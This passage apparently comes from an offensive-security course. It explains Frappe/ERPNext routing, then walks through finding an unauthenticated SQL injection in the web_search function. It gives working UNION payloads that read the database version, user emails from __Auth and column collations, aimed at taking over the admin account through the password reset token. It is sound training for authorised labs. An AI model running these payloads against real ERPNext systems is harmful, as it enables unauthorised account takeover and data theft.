In a metadata-driven pattern, the application generates the necessary components to manage the data based on the metadata, including those necessary to perform Create, Read, Update, and Delete[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-3) (CRUD) operations on the data.[4](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-4)

We can tell from the use of DocTypes that Frappe follows a metadata-driven design pattern.[5](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-5) Using DocTypes in this way helps developers reuse a single full-featured application or framework for multiple types of industries and business models.

Programming in this manner is much more difficult than traditional programming[6](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-6) and can result in more "spaghetti code". However, once the core of the framework/application is built, building additional features and data types is much easier. This creates the layer of abstraction in the form of metadata (DocTypes) that is used to store data in the database.

![Figure 15: Frappe Metadata-Driven Model](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/092c51cc473409db7a0e20a193973ff5-erpnext_mdda.png)

Figure 15: Frappe Metadata-Driven Model

Essentially, the Frappe "Kernel" grabs and parses the DocTypes to create the appropriate tables in the database. One common goal of metadata-driven applications is to allow for the creation of the metadata documents via a GUI.[1:1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_261-1) This concept is also displayed in ERPNext by logging in and searching for "DocType" in the search bar. Clicking on _DocType List_ shows a list of all DocTypes.

![Figure 16: Listing all DocTypes](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/a866fe9646801f1aabb6ccd06bd7aa47-erpnext_all_doctypes.png)

Figure 16: Listing all DocTypes

We can click on any of the DocTypes to inspect the details contained within. The listing below displays clicking on the "Stock Entry Detail" DocType.

![Figure 17: Stock DocType](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/e094e2fdfdcdcd866fb931c37d4f20b5-erpnext_stock_doctype.png)

Figure 17: Stock DocType

While it is possible to create a DocType by clicking _New_ in the top right corner, this particular DocType was created during installation and can be found in the application's code at:

```
apps/erpnext/erpnext/stock/doctype/stock_entry_detail/stock_entry_detail.json
```

> Listing 18 - Path to stock_entry_detail.json

Below, we have the DocType open in Visual Studio Code.

![Figure 18: Viewing DocType JSON](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/dffd00381c1ce1678b81a140bd2afb5f-erpnext_stock_doctype_json.png)

Figure 18: Viewing DocType JSON

DocTypes in Frappe are also accompanied by .py files that contain additional logic and routes that support additional features. For example, the bank account DocType found in apps/erpnext/erpnext/accounts/doctype/bank_account/ contains bank_account.py, which adds three functions for the application to use:

1. make_bank_account
2. get_party_bank_account
3. get_bank_account_details

Referring back to the documentation about DocTypes in Frappe, it states: "DocType is the basic building block of an application and encompasses all the three elements i.e. model, view and controller". The DocType encompasses the model element of MVC with a table in the database. The view is the DocType's ability to be edited and displayed as a form (this includes the ability to edit the DocType within the UI). Finally, the DocType acts as a controller by making use of the .py files that accompany the DocType.

![Figure 19: Bank Account DocType](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/4b4fe977cb90dd0b40e470f36906cdc7-erpnext_bank_account_doctype.png)

Figure 19: Bank Account DocType

Frameworks and applications that use a metadata-driven pattern need to be very flexible for use across various configurations. Because of this, interesting challenges and even more interesting solutions appear. One such solution is Frappe's choice for HTTP routing. Notice that the DocType Python file contained a string "@frappe.whitelist()" above each method. This is one of the methods that Frappe uses to route HTTP requests to the appropriate functions. We will use this information later to discover a SQL injection vulnerability.

1

(Zhang, 2017), [https://ebaas.github.io/blog/MetadataDrivenArchitecture/](https://ebaas.github.io/blog/MetadataDrivenArchitecture/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-1) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-1:1)

2

(Salesforce, 2020), [https://www.salesforce.com](https://www.salesforce.com) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-2)

3

(Wikipedia, 2020) [https://en.wikipedia.org/wiki/Create,_read,_update_and_delete](https://en.wikipedia.org/wiki/Create,_read,_update_and_delete) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-3)

4

(Salesforce, 2008), [https://www.developerforce.com/media/ForcedotcomBookLibrary/Force.com_Multitenancy_WP_101508.pdf](https://www.developerforce.com/media/ForcedotcomBookLibrary/Force.com_Multitenancy_WP_101508.pdf) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-4)

5

(ERPNext, 2019), [https://discuss.erpnext.com/t/which-design-pattern-is-followed-by-frappe-developers-building-the-framework/41662/3](https://discuss.erpnext.com/t/which-design-pattern-is-followed-by-frappe-developers-building-the-framework/41662/3) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-5)

6

(Stackexchange, 2017), [https://softwareengineering.stackexchange.com/a/357202](https://softwareengineering.stackexchange.com/a/357202) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_261-6)

### 5.2.3. HTTP Routing in Frappe

In modern web applications, HTTP routing is used to map HTTP requests to their corresponding functions. For example, if a GET request to /user runs a function to obtain the current user's information, that route must be defined somewhere in the application.

Frappe uses a Python _decorator_ with the function name _whitelist_ to expose API endpoints.[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_262-1) This function is defined in apps/frappe/frappe/__init__.py.

```
470  whitelisted = []
471  guest_methods = []
472  xss_safe_methods = []
473  def whitelist(allow_guest=False, xss_safe=False):
474          """
475          Decorator for whitelisting a function and making it accessible via HTTP.
476          Standard request will be `/api/method/[path.to.method]`
477
478          :param allow_guest: Allow non logged-in user to access this method.
479
480          Use as:
481
482                  @frappe.whitelist()
483                  def myfunc(param1, param2):
484                          pass
485          """
486          def innerfn(fn):
487                  global whitelisted, guest_methods, xss_safe_methods
488                  whitelisted.append(fn)
489
490                  if allow_guest:
491                          guest_methods.append(fn)
492
493                          if xss_safe:
494                                  xss_safe_methods.append(fn)
495
496                  return fn
497
498          return innerfn
499
```

> Listing 19 - Whitelist function in __init__.py

Essentially, when a function has the "@frappe.whitelist()" decorator above it, the _whitelist_ function is executed and the function being called is added to a list of whitelisted functions (line 488), _guest_methods_ (line 490-491), or _xss_safe_methods_ (line 493-494). This list is then used by the handler found in the apps/frappe/frappe/handler.py file. An HTTP request is first processed by the _handle_ function.

```
15  def handle():
16          """handle request"""
17          cmd = frappe.local.form_dict.cmd
18          data = None
19
20          if cmd!='login':
21                  data = execute_cmd(cmd)
22
23          # data can be an empty string or list which are valid responses
24          if data is not None:
25                  if isinstance(data, Response):
26                          # method returns a response object, pass it on
27                          return data
28
29                  # add the response to `message` label
30                  frappe.response['message'] = data
31
32          return build_response("json")
33
```

> Listing 20 - Handle function in handler.py

First, the _handle_ function extracts the _cmd_ that the request is attempting to execute (line 17). This value is obtained from the _frappe.local.form_dict.cmd_ variable. As long as the command (_cmd_) is not "login" (line 20), the command is passed to the _execute_cmd_ function (line 21).

```
34  def execute_cmd(cmd, from_async=False):
35          """execute a request as python module"""
36          for hook in frappe.get_hooks("override_whitelisted_methods", {}).get(cmd, []):
37                  # override using the first hook
38                  cmd = hook
39                  break
40
41          try:
42                  method = get_attr(cmd)
43          except Exception as e:
44                  if frappe.local.conf.developer_mode:
45                          raise e
46                  else:
47                          frappe.respond_as_web_page(title='Invalid Method', html='Method not found',
48                          indicator_color='red', http_status_code=404)
49                  return
50
51          if from_async:
52                  method = method.queue
53
54          is_whitelisted(method)
55
56          return frappe.call(method, **frappe.form_dict)
```

> Listing 21 - execute_cmd function in handler.py

The _execute_cmd_ function will attempt to find the command and return the method (line 42). If the method was found, Frappe will check if it is whitelisted (line 54) using the _whitelisted_ list. If it is found, the function is executed. We can inspect this process in the _is_whitelisted_ function.

```
59  def is_whitelisted(method):
60          # check if whitelisted
61          if frappe.session['user'] == 'Guest':
62                  if (method not in frappe.guest_methods):
63                          frappe.msgprint(_("Not permitted"))
64                          raise frappe.PermissionError('Not Allowed, {0}'.format(method))
65
66                  if method not in frappe.xss_safe_methods:
67                          # strictly sanitize form_dict
68                          # escapes html characters like <> except for predefined tags like a, b, ul etc.
69                          for key, value in frappe.form_dict.items():
70                                  if isinstance(value, string_types):
71                                          frappe.form_dict[key] = frappe.utils.sanitize_html(value)
72
73          else:
74                  if not method in frappe.whitelisted:
75                          frappe.msgprint(_("Not permitted"))
76                          raise frappe.PermissionError('Not Allowed, {0}'.format(method))
```

> Listing 22 - is_whitelisted function in handler.py

The _is_whitelisted_ method simply checks to ensure the function being executed is in the list of whitelisted functions.

This means that the client can call any Frappe function directly if the _@frappe.whitelist()_ decorator is in use for that function. In addition, if "allow_guest=True" is also passed in the decorator, the user does not have to be authenticated to run the function.

If the _is_whitelisted_ function does not raise any exceptions, the _execute_cmd_ function will call _frappe.call_ and pass all the arguments in the request to the function (line 56 of handler.py).

Let's load a page and attempt to discover what a request that calls the function directly looks like.

To do this, we will open Burp and configure Firefox to use it as a proxy. When the root page of ERPNext is loaded, we will capture a request that attempts to run a Python function directly. The request we capture is triggered automatically on page load.

![Figure 20: Capturing Direct Function Execution Request](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/4a591e02a4db42e63ac925045729d6b2-erpnext_direct_function.png)

Figure 20: Capturing Direct Function Execution Request

The command in Figure 20 that attempts to execute can be found in Listing 23.

```
frappe.website.doctype.website_settings.website_settings.is_chat_enabled
```

> Listing 23 - cmd from captured request

Searching for the _is_chat_enabled_ function within the code leads us to the following file:

```
apps/frappe/frappe/website/doctype/website_settings/website_settings.py
```

> Listing 24 - Location of the is_chat_enabled function

We can open this file in Visual Studio Code to reveal the _is_chat_enabled_ function.

![Figure 21: is_chat_enabled in website_settings.py](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/8e560366857386664d027bb3341037fb-erpnext_website_settings.py.png)

Figure 21: is_chat_enabled in website_settings.py

Frappe uses the directory structure to find the file and function to execute, as shown in Listing 25.

```
frappe.website.doctype.website_settings.website_settings.is_chat_enabled
apps/frappe/frappe/website/doctype/website_settings/website_settings.py
```

> Listing 25 - Comparing cmd to file structure

Based on the function code, we'll notice the _is_chat_enabled_ function also contains "@frappe.whitelist(allow_guest=True)", which allows the command to be executed by an unauthenticated user.

```
144  @frappe.whitelist(allow_guest=True)
145  def is_chat_enabled():
146          return bool(frappe.db.get_single_value('Website Settings', 'chat_enable'))
```

> Listing 26 - Reviewing is_chat_enabled function

Now that we know how a request is handled, we can move forward in the vulnerability discovery process. The designation of guest-accessible routes will allow us to create a list of starting points to search for vulnerabilities that could lead to authentication bypass.

#### Exercise

Now that we know how the functions are executed, find all whitelisted, guest-allowed functions.

1

(Github, 2019), [https://github.com/frappe/frappe/wiki/Developer-Cheatsheet#how-to-make-public-api](https://github.com/frappe/frappe/wiki/Developer-Cheatsheet#how-to-make-public-api) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_262-1)

## 5.3. Authentication Bypass Discovery

Now that the results of the previous exercise provide us with a manageable list of endpoints that are accessible by unauthenticated users, we can begin hunting for vulnerabilities. However, we still need a methodology to review the results. One way of doing this is to search for functions that break the MVC or metadata-driven pattern. Since the list of endpoints represents the user's direct interaction with the application, we can treat these as controllers. Searching for direct modifications of the model or view in the controller could point us in the direction of a vulnerability. We could accomplish this by searching for SQL queries directly in the whitelisted functions.

### 5.3.1. Discovering the SQL Injection

Searching for SQL in the 91 guest-whitelisted results, we quickly find the _web_search_ function in the apps/frappe/frappe/utils/global_search.py file.

![Figure 22: Finding web_search in global_search.py](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/d9352aba621fbba1edcb874d4881d61e-erpnext_web_search_function.png)

Figure 22: Finding web_search in global_search.py

The function begins by defining four arguments: _text_, _scope_, _start_, and _limit_:

```
459  @frappe.whitelist(allow_guest=True)
460  def web_search(text, scope=None, start=0, limit=20):
461          """
462          Search for given text in __global_search where published = 1
463          :param text: phrase to be searched
464          :param scope: search only in this route, for e.g /docs
465          :param start: start results at, default 0
466          :param limit: number of results to return, default 20
467          :return: Array of result objects
468          """
```

> Listing 27 - Reviewing web_search function - definition

Next, the _web_search_ function splits the _text_ variable into a list of multiple search strings and begins looping through them.

```
470          results = []
471          texts = text.split('&')
472          for text in texts:
```

> Listing 28 - Reviewing web_search function - splitting

Within the _for_ loop, the query string is set and the string is formatted. However, not all of the parameters are appended to the query in the same way.

```
473               common_query = ''' SELECT `doctype`, `name`, `content`, `title`, `route`
474                       FROM `__global_search`
475                       WHERE {conditions}
476                       LIMIT {limit} OFFSET {start}'''
477
478               scope_condition = '`route` like "{}%" AND '.format(scope) if scope else ''
479               published_condition = '`published` = 1 AND '
480               mariadb_conditions = postgres_conditions = ' '.join([published_condition, scope_condition])
481
482               # https://mariadb.com/kb/en/library/full-text-index-overview/#in-boolean-mode
483               text = '"{}"'.format(text)
484               mariadb_conditions += 'MATCH(`content`) AGAINST ({} IN BOOLEAN MODE)'.format(frappe.db.escape(text))
485               postgres_conditions += 'TO_TSVECTOR("content") @@ PLAINTO_TSQUERY({})'.format(frappe.db.escape(text))
486
487               result = frappe.db.multisql({
488                       'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, start=start),
489                       'postgres': common_query.format(conditions=postgres_conditions, limit=limit, start=start)
490               }, as_dict=True)
```

> Listing 29 - Reviewing web_search function - SQL

On lines 484 and 485, the _text_ is appended to the query using the _format_ function but the string is first passed into a _frappe.db.escape_ function. However, on lines 480, 488, and 489, the parameters are not escaped, potentially allowing us to inject SQL. This means that we could SQL inject the _scope_, _limit_, and _start_ arguments.

Let's first modify the request we currently have that runs a Python function to execute _web_search_ and set a breakpoint on it to pause on execution.

To pause execution early in the _web_search_ function, we will place the breakpoint on line 470 next to the line that reads "results = []".

![Figure 23: Setting Breakpoint on Line 470](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/bbaeb5edf34429b7247f8ff9d58fa5c4-erpnext_setting_breakpoint_470.png)

Figure 23: Setting Breakpoint on Line 470

Next, we will send the _is_chat_enabled_ request to Repeater and modify it to run the _web_search_ function.

![Figure 24: Sending Request to Repeater](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/d7e4d461be685c14e14711a335f8f1c3-erpnext_sending_to_repeater.png)

Figure 24: Sending Request to Repeater

Once in Repeater, we need to modify the request to match the file path and the function call. The file path for the _web_search_ function is apps/frappe/frappe/utils/global_search.py and would make the _cmd_ call "frappe.utils.global_search.web_search".

![Figure 25: Setting the cmd Variable](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/034ff10b77cb95b5af1b39135b5126d5-erpnext_setting_cmd.png)

Figure 25: Setting the cmd Variable

The only variable in the _web_search_ function that does not have a default value is _text_. We will set this in the Burp request by adding an ampersand (&) after the _cmd_ value, and we will set the _text_ variable to "offsec" as shown in Figure 26.

![Figure 26: Partial Payload in Burp](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/fa1eacb65673f4a5605aab0b737ac2db-erpnext_trigger_web_search.png)

Figure 26: Partial Payload in Burp

With everything configured, we can send the request off by clicking _Send_ in Burp. We should capture the request in Visual Studio Code's debugger.

![Figure 27: Triggering the Breakpoint on web_search](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/5a7625acf31b65f4a6bff9a144a449dd-erpnext_triggering_breakpoint_web.png)

Figure 27: Triggering the Breakpoint on web_search

With the breakpoint triggered, we can continue execution by pressing the _Resume_ button or % on the keyboard. This will return a response in Burp with a JSON object containing the message object and an empty array.

Now that we can trigger the request while observing what is happening, we can start trying to exploit the SQL injection. To do this, we will first remove the breakpoint on line 470 and add a new breakpoint on line 487 where the query is sent to the _multisql_ function as shown in Listing 30. This will allow us to inspect the query just before it is executed.

```
result = frappe.db.multisql({
	'mariadb': common_query.format(conditions=mariadb_conditions, limit=limit, start=start),
	'postgres': common_query.format(conditions=postgres_conditions, limit=limit, start=start)
}, as_dict=True)
```

> Listing 30 - Running the multisql function on Line 487

We will send the Burp request again, stop execution at the breakpoint, and past the formatting to enter into the _frappe.db.multisql_ function. From this function, we can inspect the full SQL command just before it is executed.

First, let's send the request again clicking _Send_ in Burp. This will stop execution on line 487.

![Figure 28: Pausing Execution on Line 487](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/8b005a7c8b55636b5ed9fae5070bd86a-erpnext_pausing_exec_487.png)

Figure 28: Pausing Execution on Line 487

We can _Step Over_ the next three execution steps as those are preparing and formatting the query before passing it into the _frappe.db.multisql_ function.

![Figure 29: Pausing Execution on Line 487](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/346f06b914c655594da9ccb25c58dce2-erpnext_pausing_exec_487_step.png)

Figure 29: Pausing Execution on Line 487

On the fourth execution step (line 490), we will _Step Into_ the _frappe.db.multisql_ function.

![Figure 30: Stepping into multisql Function](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/41d6eae320b0331be260dc7e336d3f2d-erpnext_stepping_into_multisql.png)

Figure 30: Stepping into multisql Function

This will take us into the apps/frappe/frappe/database/database.py file. From here, we can open the debugging tab, expand the _sql_dict_ variable, and examine the SQL query before it is executed.

![Figure 31: Viewing sql_dict in Debugger](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/e9e10204ce87d576c54818b9a3759b72-erpnext_sql_dict_debugger.png)

Figure 31: Viewing sql_dict in Debugger

A cleaned-up version of the SQL query can be found in Listing 31 below.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```

> Listing 31 - Cleaned up initial SQL command

With the SQL query captured, let's click _Resume_ in the debugger to continue execution. We can also confirm that this is the SQL query the database executed by returning to the mysql.log file.

```
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log
   1553 Connect   _1bd3e0294da19198@localhost as anonymous on 
   1553 Query     SET AUTOCOMMIT = 0
   1553 Init DB   _1bd3e0294da19198
   1553 Query     select `user_type`, `first_name`, `last_name`, `user_image` from `tabUser` where `name` = 'Guest' order by modified desc
   1553 Query     SELECT `doctype`, `name`, `content`, `title`, `route`
          FROM `__global_search`
          WHERE `published` = 1 AND  MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
          LIMIT 20 OFFSET 0
   1553 Query     rollback
   1553 Query     START TRANSACTION
   1553 Quit
```

> Listing 32 - Database log for web_search function

With the initial query generated, we can start using the other potentially-vulnerable parameters like _scope_. Let's set the _scope_ variable to a value and examine how the query changes. We will set the value to "offsec_scope".

Using values like "offsec_scope" allows us to have a unique token that we are in control of. This allows us to grep through logs and query in databases if needed. If a value of "test" was used, we might have a lot of false positives if we need to grep for it.

![Figure 32: Setting Scope Variable](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/a4fd96db651b2a6c4754aa02cd3d317c-erpnext_setting_scope.png)

Figure 32: Setting Scope Variable

With the _scope_ variable set, we can pull the SQL command again from either the database logs or the breakpoint set in the code.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```

> Listing 33 - SQL query with scope variable

With the SQL command extracted, next we need to:

1. Terminate the double quote.
2. Add a UNION statement to be able to extract information.
3. Comment out the remaining SQL command.

Since the SQL query has five parameters (_doctype_, _name_, _content_, _title_, and _route_), we know that our UNION injection will have five parameters. The SQL injection payload can be found in Listing 34.

```
offsec_scope" UNION ALL SELECT 1,2,3,4,5#
```

> Listing 34 - Initial SQL injection payload

The payload starts with the _offsec_scope_ variable. Next, we'll terminate the double quote, add the UNION query that will return five numbers, and finally comment out the rest of the query with a "#" character. Let's send this payload and inspect the response.

![Figure 33: Initial SQL Injection Payload in Burp](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/74ba7ea09362b3aaba3163102ab10456-erpnext_sqli_in_burp.png)

Figure 33: Initial SQL Injection Payload in Burp

The payload with the injection has the response shown in Listing 35. With this, we know where we can inject additional queries to pull necessary information.

```
{"message":[{"route":"5","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
```

> Listing 35 - Response to SQL injection

We can extract the SQL query again from the debugger or the database logs.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,5#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```

> Listing 36 - SQL query with injection

Anything after the "5" is commented out and will be ignored. Next, let's attempt to extract the version of the database by replacing the "5" with "@@version".

![Figure 34: SQL Injection to Extract Version](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/61c0c51961c8736cd727e3ff207fa1d4-erpnext_sqli_extract_version.png)

Figure 34: SQL Injection to Extract Version

The query returns the version found in Listing 37, which confirms the SQL injection.

```
10.2.24-MariaDB-10.2.24+maria~xenial-log
```

> Listing 37 - Database software version

Next, let's figure out what information we need to extract to obtain a higher level of access to the application.

#### Exercises

1. Recreate the SQL injection.
2. Attempt to discover how the _web_search_ function is used in the UI. Would it have been possible to discover this kind of vulnerability in a black box assessment?

## 5.4. Authentication Bypass Exploitation

At this point, we have achieved SQL injection into a SELECT statement. Now we need to figure out how to leverage it to escalate our privileges. Let's attempt to login as the administrator account.

_PyMysql_, the Python MySQL client library,[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_265-1) does not allow multiple queries in one execution unless "multi=True" is specified in the _execute_ function. Searching through the code, it does not appear that "multi=True" is set. This means that we have to stick with the SELECT query we currently have and cannot INSERT new rows or UPDATE existing rows in the database.

Frappe passwords are hashed[2](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_265-2) with PBK DF2.[3](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_265-3) While it might be possible to crack the passwords, an easier route might be to hijack the password reset token. Let's visit the homepage to verify that Frappe does indeed have password reset functionality.

![Figure 35: Frappe Password Reset](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/1c71cf302835e7afe42135f4c7f40b5c-erpnext_password_reset.png)

Figure 35: Frappe Password Reset

Next, we'll determine what tables to query to extract the password reset token value.

1

(MySQL, 2020), [https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html](https://dev.mysql.com/doc/connector-python/en/connector-python-api-mysqlcursor-execute.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_265-1)

2

(Frappe, 2020), [https://frappe.io/docs/user/en/users-and-permissions#password-hashing](https://frappe.io/docs/user/en/users-and-permissions#password-hashing) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_265-2)

3

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_265-3)

### 5.4.1. Obtaining Admin User Information

The Frappe documentation for passwords states that Frappe keeps the name and password in the ___Auth_ table.[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_266-1) However, this table does not have a field for the password reset key, so we'll have to search the database for the key location.

Since Frappe uses a metadata-driven pattern, the database has a lot of tables. We could find the user table by simply using the application as intended and inspecting the logs for submitted data. For this section, we want to figure out where the reset key is stored.

Let's visit the password reset page by clicking on the "Forgot Password?" link on the login page. From here, we can use a token value to reset the password. This token will allow us to more easily search through the logs to find the correct entry. We will use the email "token_searchForUserTable@mail.com" as the token.

![Figure 36: Password Reset for Token](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/5f97d884871154ed4ab4657617d69d8e-erpnext_token_password_reset.png)

Figure 36: Password Reset for Token

Before clicking _Send Password_, we will also start a command to follow the database logs and grep for our token as shown in Listing 38.

Next, let's click _Send Password_ and we will receive an error. We will find that the database log command displays an entry.

```
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log | grep token_searchForUserTable
  4980 Query     select * from `tabUser` where `name` = 'token_searchForUserTable@mail.com' order by modified desc
```

> Listing 38 - Discovered table for password reset

We have just discovered the _tabUser_ table.

1

(Frappe, 2020), [https://docs.frappe.io/framework/v14/user/en/basics/users-and-permissions#password-hashing](https://docs.frappe.io/framework/v14/user/en/basics/users-and-permissions#password-hashing) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fnref-local_id_266-1)

### 5.4.2. Resetting the Admin Password

Now that we know which tables we need to target, let's create a SQL query to extract the email/name of the user. The documentation says that the email can be found in the name column in the ___Auth_ table. A non-SQL injection query would be similar to the one found in Listing 39.

```
SELECT name FROM __Auth;
```

> Listing 39 - Standard query for extracting the name/email

However, we need the query in Listing 39 to be usable in the UNION query. For this, we need to replace one of the numbers with the _name_ column and add a "FROM __Auth" to the end of the UNION query. The query we are attempting to execute can be found in Listing 40.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```

> Listing 40 - Target query we are attempting to execute

The highlighted part in Listing 40 will be the payload to the SQL injection. Next, we will place the payload in Burp, send the request, and inspect the response.

![Figure 37: SQL Injection Collation Error](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/4c8eed82933465289e48e33786633a5a-erpnext_sqli_collation_error.png)

Figure 37: SQL Injection Collation Error

This is where we run into our first error. Frappe responds with the error "Illegal mix of collations for operation 'UNION'".

Database collation describes the rules determining how the database will compare characters in a character set. For example, there are collations like "utf8mb4_general_ci" that are case-insensitive (indicated by the "ci" at the end of the collation name). These collations will not take the case into consideration when comparing values.[1](https://portal.offsec.com/courses/web-300-687/learning/erpnext-authentication-bypass-and-server-side-template-injection-10581/wrapping-up-10663/wrapping-up-10759#fn-local_id_267-1)

It is possible for us to force a collation within the query. However, we first need to discover the collation used in the ___global_search_ table that we are injecting into. We can do this using the query found in Listing 41.

```
SELECT COLLATION_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
```

> Listing 41 - Query to discover collation

Since this is a whitebox assessment, we could run the query in Listing 41 directly on the host. However, the collation across builds and versions of an application might be different. It is best practice to extract values like the collation directly from the host we are targeting. For this reason, we will use our SQL injection to extract the collation.

Like the previous payload, we have to change this query to fit into a UNION query. We want the final query to be like the one found in Listing 42.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name"#%" AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0
```

> Listing 42 - Full query to discover collation

The highlighted part in Listing 42 will become the payload we send in Burp.

![Figure 38: Discovering Collation via SQLi](https://static.offsec.com/offsec-courses/WEB-300/images/erpnext/534ee277e9f51bf37ff89818fc7b53b7-erpnext_sqli_discover_collation.png)

Figure 38: Discovering Collation via SQLi

This request returns the value of "utf8mb4_general_ci" as the collation for the name column in the ___global_search_ table. With this information, let's edit our previous payload to include the "COLLATE utf8mb4_general_ci" command. The query we are attempting to run is as follows:

```
SELECT name COLLATE utf8mb4_general_ci FROM __Auth;
```

> Listing 43 - Standard query for extracting the name/email with collation

This makes the final query similar to the one found in Listing 44.

```
SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
